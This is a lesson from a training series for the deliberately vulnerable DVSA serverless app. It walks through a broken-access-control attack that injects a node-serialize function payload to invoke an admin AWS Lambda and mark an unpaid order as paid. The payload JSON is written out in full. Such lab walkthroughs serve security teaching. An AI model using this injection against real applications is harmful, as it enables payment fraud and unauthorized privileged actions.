# LESSON #5: Broken Access Control

The DVSA application has some admin functions. Although these functions are not available through the standard API calls, the function that receives the API calls has permissions to invoke any function. Since the function is vulnerable to [code injection](../LESSONS/LESSON_01.md) it is possible to invoke admin functions using the standard API calls.

This means that by invoking the right function at the right time, we can skip the payment. But, first, we start with the normal flow:

- `{"action": "new", "cart-id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", "items": { "<item-id>":<qty>, "<item-id>":<qty>, ... }}`

- `{"action": "shipping", "order-id": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy", "data": {"address":"<address>", "email":"<email>", "name":"<name>"}}`

- `{"action": "billing", "order-id": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy", "data": {"ccn":"4242424242424242", "exp":"11/22", "cvv":"123 }}`

Now that we have an order that is missing only the payment, let's exploit.

The admin function receives an order ID and the parameters to update, so we can send something like this:

```
{
  "body": {
    "action": "update",
    "order-id": "cc241d5c-f665-48db-8e55-4391f62465ba",
    "item": {
      "userId": "12312312-1233-1233-1233-123123123123",
      "token": "aSD32d2ASd2",
      "ts": "1545594489",
      "itemList": {
        "20": 2
      },
      "address": {
        "name": "john doe",
        "email": "secret@email.com",
        "address": "po box 31337"
      },
      "total": 25,
      "status": 120
    }
  }
}
```

Now, we have to pass it as part of the exploit itself:

```
{"action": "_$$ND_FUNC$$_function(){var p=JSON.stringify(' + new_order + ');var a=require(\\"aws-sdk\\");var l=new a.Lambda();var x={FunctionName:\\"DVSA-ADMIN-UPDATE-ORDERS\\",InvocationType:\\"RequestResponse\\",Payload:p};l.invoke(x, function(e,d){});}()"}
```

Which eventually looks like this:

```
{"action": "_$$ND_FUNC$$_function(){var p=JSON.stringify({\"headers\":{\"authorization\":\"eyJra ... l7g10i5Q\"}, \"body\":{\"action\":\"update\", \"order-id\": \"480e3996-e8a7-4fdb-bc12-94fdae1e14fb\", \"item\":{\"token\": \"VFqDWCgagMO7\", \"ts\": 1546482872, \"itemList\": {\"11\": 1, \"12\": 1}, \"address\": \"100 Fake st., NYC, USA\", \"total\": 74, \"status\": 120}}});var a=require(\"aws-sdk\");var l=new a.Lambda();var x={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:p};l.invoke(x, function(e,d){});}()"}
```

![alt stealing](https://i.imgur.com/FrzRrjS.png)

We got an error from the API function. But the database was updated with the new data. Since we did not issue a SQS notification for the payment, the receipt will be proccessed with a daily cron-job function. However, it is already possible to see it in the orders page.


Before:
![alt before](https://i.imgur.com/9nENtUW.png)

After:
![alt after](https://i.imgur.com/czspPpV.png)


- - -
[ToC](../LESSONS/README.md) | [1](../LESSONS/LESSON_01.md) | [2](../LESSONS/LESSON_02.md) | [3](../LESSONS/LESSON_03.md) | [4](../LESSONS/LESSON_04.md) | [5](../LESSONS/LESSON_05.md) | [6](../LESSONS/LESSON_06.md) | [7](../LESSONS/LESSON_07.md) | [8](../LESSONS/LESSON_08.md) | [9](../LESSONS/LESSON_09.md) | [10](../LESSONS/LESSON_10.md)

